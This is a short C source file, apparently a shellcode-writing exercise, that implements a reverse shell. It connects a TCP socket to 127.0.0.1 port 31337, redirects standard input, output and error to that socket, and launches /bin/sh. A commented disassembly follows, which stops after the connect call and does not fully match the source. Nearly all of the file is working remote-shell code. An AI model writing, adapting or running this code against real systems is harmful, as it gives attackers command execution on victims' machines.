#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <netinet/in.h>
#include <string.h>

int _main()
{
	int sockfd;
	int i;
	struct sockaddr_in addr;

	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = inet_addr("127.0.0.1");
	addr.sin_port = htons(31337);

	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	connect(sockfd, (struct sockaddr *) &addr, sizeof(addr));
	for (i = 0; i < 3; i++)
    	{
        	dup2(sockfd, i);
    	}

	execve("/bin/sh", NULL, NULL);

}


/*
   0x08048ee0 <+0>:	push   %ebp
   0x08048ee1 <+1>:	mov    %esp,%ebp
   0x08048ee3 <+3>:	sub    $0x38,%esp
   0x08048ee6 <+6>:	movw   $0x2,-0x1c(%ebp)
   0x08048eec <+12>:	movl   $0x80c5ac8,(%esp)
   0x08048ef3 <+19>:	call   0x80557a0 <inet_addr>
   0x08048ef8 <+24>:	mov    %eax,-0x18(%ebp)
   0x08048efb <+27>:	movl   $0x7a69,(%esp)
   0x08048f02 <+34>:	call   0x8055d10 <ntohs>
   0x08048f07 <+39>:	mov    %ax,-0x1a(%ebp)
   0x08048f0b <+43>:	movl   $0x0,0x8(%esp)
   0x08048f13 <+51>:	movl   $0x1,0x4(%esp)
   0x08048f1b <+59>:	movl   $0x2,(%esp)
   0x08048f22 <+66>:	call   0x8055370 <socket>
   0x08048f27 <+71>:	mov    %eax,-0xc(%ebp)
   0x08048f2a <+74>:	movl   $0x10,0x8(%esp)
   0x08048f32 <+82>:	lea    -0x1c(%ebp),%eax
   0x08048f35 <+85>:	mov    %eax,0x4(%esp)
   0x08048f39 <+89>:	mov    -0xc(%ebp),%eax
   0x08048f3c <+92>:	mov    %eax,(%esp)
   0x08048f3f <+95>:	call   0x80552b0 <connect>
   0x08048f44 <+100>:	leave  
   0x08048f45 <+101>:	ret  
*/
